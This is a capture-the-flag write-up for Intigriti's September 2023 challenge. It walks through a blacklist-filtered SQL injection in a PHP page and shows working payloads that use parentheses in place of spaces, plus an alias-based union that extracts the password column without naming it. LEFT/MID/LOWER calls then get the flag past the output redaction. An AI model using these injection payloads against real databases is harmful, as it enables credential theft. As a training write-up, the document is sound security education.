# Writeup Intigriti challenge-0923

Tags: writeup Created time: September 27, 2023 6:48 PM Created time 1: September 27, 2023 6:48 PM

* This is an interesting challenge, so I want to write in detail and analyze the process I followed, as well as provide a clear explanation of the issues I encountered when approaching this challenge.

> **Overview**

* The challenge interface looks like this:
* We have full access to the source code in path [`challenge.php?showsource=1`](http://challenge-0923.intigriti.io/challenge.php?showsource=1) , so this is a whitebox challenge. Let's read and analyze it together

```php
$max = 10;

if (isset($_GET['max']) && !is_array($_GET['max']) && $_GET['max']>0) {
    $max = $_GET['max'];
    $words  = ["'","\"",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","\r","\n","\t","\v","\f"]; // list of characters to check
    foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $max)) {
            exit("H4ckerzzzz");
        } //no weird chars
    }       
}

try{
//seen in production
$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");
$stmt->execute();
$results = $stmt->fetchAll();
}
catch(\PDOException $e){
    exit("ERROR: BROKEN QUERY");
}
```

Quick explanation of the code snippet above.

1. The code checks if a GET parameter named `**max`\*\* is present in the URL and if it meets certain criteria. It ensures that `**max`\*\* is not an array and that its value is greater than 0 → So it must be a number.
2. An array named **`$words`** is defined, which contains a list of characters to check for in the `**max`\*\* parameter. This list includes various characters that are often associated with security vulnerabilities when handling user input.
3. The code then iterates through each character in the **`$words`** array using a **`foreach`** loop. Inside the loop, it uses a regular expression (**`preg_match`**) to check if the character exists in the `**max`\*\* parameter. If any of these characters are found in the `**max`\*\* parameter, it exits the script with the message "H4ckerzzzz." → **yeah we have to bypass this**
4. After validating the `**max`\*\* parameter, the code attempts to execute a database query. It uses the **`prepare`** method to create a prepared statement with a SQL query that selects `**id` , `name`\*\* and `**email`\*\* from a `**users`\*\* table where `**id`\*\* is less than or equal to the value of **`$max`**.
5. The prepared statement is executed using the **`execute`** method, and the results are fetched into the **`$results`** variable using **`fetchAll`**.

> So the first question is **How we can bypass that blacklist and trigger SQLi?**

* At first, I tried many different approaches, but I was limited by characters like `'`, `"`, `;`, `,` which are necessary for SQLi
* When using only **`'`**, I got some information, but it's essentially because the value of **`max`** needs to be a number to satisfy the condition **`$_GET['max']>0`**, and of course, I got blocked.
* After a day of searching and researching, I observed that what was necessary at this point was the ability to perform a UNION, and what we needed most was to bypass spaces.
* Of course, none of common payload like **(/**/), %09, %0D, %0A….\*\* were effective as they are all blacklisted characters.
* Play around and printing out all the special characters that weren't filtered, I noticed something interesting: **parentheses** `()` weren't filtered.
  * With this characters, we can immediately execute the **UNION** query. However, we need to consider the initial value of the `max` variable, which should be a number to satisfy the condition `$_GET['max']>0`. So, I used **`1*(1)union(select(1),(2),(3))`** because the character `*` is not blocked\*\*.\*\* Of course, it's easy to recognize that this is MySQL.

> Now, we encountered the **second issue**: How to query the value of the **password?**

* At this point, despite my efforts, I was stuck until I received the first hint from INTIGRITI.
* I searched around Google and found [**this article**](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/). It turned out to be the way to Bypass Column Names Restriction exactly. In essence, it goes like this:
  * **MySQL** supports aliases, which are used to give a table or a column in a table a temporary name. Aliases are often used to make column names more readable or to provide a shorter name for a table or column when writing SQL queries

```sql
mysql> select 1 as alias from users;

+-------+
| alias |
+-------+
|     1 |
+-------+
```

* An alias is created with the `**AS`\*\* keyword, which violates the blacklist. However, an interesting point is that we can still create aliases without using the `**AS**` keyword, as follows:

```sql
mysql> select 1 from (select 1,2,3,4 union select * from users)alias;

+-------+
| alias |
+-------+
|     1 |
+-------+
```

* One great feature of aliases is that they allow us to directly query a column using the column's name within the alias. For example, if we have a column named `**column_name`\*\* in a table called `**alias` →\*\* we can query it using the syntax `**alias.column_name**`
* And when we use the query **`select 1, 2, 3, 4 union select * from users`**, we're actually assigning names to 4 columns, virtual names being 1, 2, 3, and 4. After the **union** with the `**users`\*\* table, we can query the values of the `**password`\*\* column through without explicitly referencing the `**password`\*\* keyword.

```sql
mysql> select F.4 from (select 1, 2, 3, 4 union select * from users)F;
+-------------+
| 4           |
+-------------+
| 4           |
| password    |
+-------------+
```

* This query means I am querying the value of the fourth column in the newly created table F (at this point, table F includes 4 columns: id, name, email, **password** from the users table and the values 1, 2, 3, 4 correspondingly).
* So, returning to the challenge, after combining the above idea of bypassing spaces using parentheses, we get the following payload:

```sql
1*(1)union(select(1),(2),(F.4)from(select(1),(2),(3),(4)union(select*from(users)))F)
```

* And got the flag….
* At this point, I thought it was all done, but I only received the string **REDACTED** ??

```php
<?php foreach ($results as $row): ?>
    <tr>
        <td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
        <td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
        <td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
    </tr>
<?php endforeach; ?>
```

* From this piece of code, we can understand that when displaying the value of a row, if there's the term \*\*`INTIGRITI`\*\*it \*\*\*\*will immediately be replaced with `**REDACTED**`. However, as we know, the flag format is **INTIGRITI{..}**. So, we are confident that we're on the right track, and this is the final step.

> So, the final question is: How can we display the flag **without including** the string **INTIGRITI**?

* Here, I searched and listed all the functions in MySQL that don't include keywords from the blacklist. Some of the functions that caught my attention were **LEFT**, **MID**, and **LOWER**.
* With **LEFT and MID**: I realized that with **`LEFT(F.4,8)`**, I can see the beginning of the flag content, which is **`INTIGRIT`**, because printing the entire **`INTIGRITI`** would be blocked. So, I combined it with **MID** to display the content.

like this

* So when combine with the function **MID**, we got the flag

```php
1*(1)union(select(LEFT(F.4,8)),(MID(F.4,10)),(3)from(select(1),(2),(3),(4)union(select*from(users)))F)
```

* Observe this more clearly in the browser

> Flag: **INTIGRITI{bl4ckli5t1ng\_1z\_n0t\_7h3\_w4y}**

* Another faster way is to use `LOWER` since it only checks for the `**INTEGRITI`\*\* substring. So, simply displaying it without this substring on the screen is sufficient. That's right, using `LOWER` to convert all characters in the flag to lowercase, including the `**intergriti`\*\* substring.

```php
1*(1)union(select(LEFT(F.4,8)),(MID(F.4,9)),(LOWER(F.4))from(select(1),(2),(3),(4)union(select*from(users)))F)
```

* **However**, one noteworthy point here is that in cases where the flag contains a mixture of uppercase and lowercase characters like **`INTIGRITI{BL4CKli5t1ng_1z_n0t_7h3_W4Y}`**, using **LOWER()** might not be the best idea. But, for this specific case, it works quite well.

### Conclusion:

* This is a very interesting challenge. I have learned a new way to use aliases to bypass blacklists and perform SQL injection queries without using column names.

> **#END**

Thank you for reading 💚.

* If you have any feedback, you can contact me through the following channels.

> **Giongfnef**
